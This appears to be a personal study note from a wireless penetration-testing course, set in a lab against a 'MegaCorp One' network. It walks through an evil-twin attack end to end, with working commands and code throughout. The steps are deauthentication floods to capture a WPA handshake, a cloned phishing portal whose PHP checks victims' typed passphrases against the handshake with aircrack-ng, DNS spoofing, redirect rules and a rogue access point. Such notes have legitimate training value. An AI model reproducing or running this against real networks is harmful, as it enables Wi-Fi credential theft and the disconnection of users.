
Idea:
- Trick clients into disclosing credentials by creating our own captive portal
- Create open network with the same name as a WPA-PSK network to get the pass


### Setup 

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```


### Identify the network

Identify the network by launching an airodump scan:
```bash
sudo airodump-ng wlan0mon
sudo airodump-ng wlan0mon --wps
sudo airodump-ng wlan0mon --band abg --wps --manufacturer
```


### Gather handshake

Start the discovery:
```bash
sudo airodump-ng -w /tmp/out --essid <ESSID> --bssid <BSSID> -c <channel> wlan0mon
```

Perform a deauthentication attack to capture a handshake: 
```bash
sudo aireplay-ng -0 0 -a <BSSID> -c <MAC> wlan0mon
sudo aireplay-ng -0 0 -a <BSSID> wlan0mon
sudo aireplay-ng -0 1 -a <BSSID> wlan0mon
```


### Build Captive Portal

Creating a captive portal from scratch:
```bash
sudo apt install apache2 libapache2-mod-php
```

Grab the index page:
```bash
wget -r -l2 https://www.megacorpone.com
```

Code:
```php
<!DOCTYPE html>
<html lang="en">

	<head>
		<link href="assets/css/style.css" rel="stylesheet">
		<title>MegaCorp One - Nanotechnology Is the Future</title>
	</head>
	<body style="background-color:#000000;">
		<div class="navbar navbar-default navbar-fixed-top" role="navigation">
			<div class="container">
				<div class="navbar-header">
					<a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
				</div>
			</div>
		</div>

		<div id="headerwrap" class="old-bd">
			<div class="row centered">
				<div class="col-lg-8 col-lg-offset-2">
					<?php
						if (isset($_GET["success"])) {
							echo '<h3>Login successful</h3>';
							echo '<h3>You may close this page</h3>';
						} else {
							if (isset($_GET["failure"])) {
								echo '<h3>Invalid network key, try again</h3><br/><br/>';
							}
					?>
				<h3>Enter network key</h3><br/><br/>
				<form action="login_check.php" method="post">
					<input type="password" id="passphrase" name="passphrase"><br/><br/>
					<input type="submit" value="Connect"/>
				</form>
				<?php
						}
				?>
				</div>

				<div class="col-lg-4 col-lg-offset-4 himg ">
					<i class="fa fa-cog" aria-hidden="true"></i>
				</div>
			</div>
		</div>

	</body>
</html>
```

Copy downloaded CSS to site page:
```bash
sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
```

PHP login_check.php:
```php
<?php
# Path of the handshake PCAP
$handshake_path = '/tmp/out-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```

Configure networking:
```bash
# Configure interface
sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up



# Provide DHCP to client
sudo apt install dnsmasq

# Config file

# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255


# Start dnsmasq
sudo dnsmasq --conf-file=mco-dnsmasq.conf
```

Firewall rules:
```bash
sudo apt install nftables
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

Modify the Apache site config file: `/etc/apache2/sites-enabled/000-default.conf`
```bash
  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```
>[!info]
>Before VirtualHost closing tag

Enable required Apache modules:
```bash
sudo a2enmod rewrite
sudo a2enmod alias
```

Restart Apache for the configuration changes to take effect:
```bash
systemctl restart apache2
```

In case Chrome is being used: `/etc/apache2/sites-enabled/000-default.conf` (breaks firefox)
```bash
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```

Enable SSL module:
```bash
sudo a2enmod ssl
sudo systemctl restart apache2
```


### Configure Rogue AP

```bash
sudo apt install hostapd
```

Config file:
```bash
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```

Run hostapd:
```bash
sudo hostapd -B mco-hostapd.conf
```

Check for DHCP logs:
```bash
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
```

Check Apache logs for incoming traffic:
```bash
sudo tail -f /var/log/apache2/access.log
```

Retrieve the correct passphrase:
```bash
sudo find /tmp/ -iname passphrase.txt
sudo cat <PATH>/passphrase.txt
```
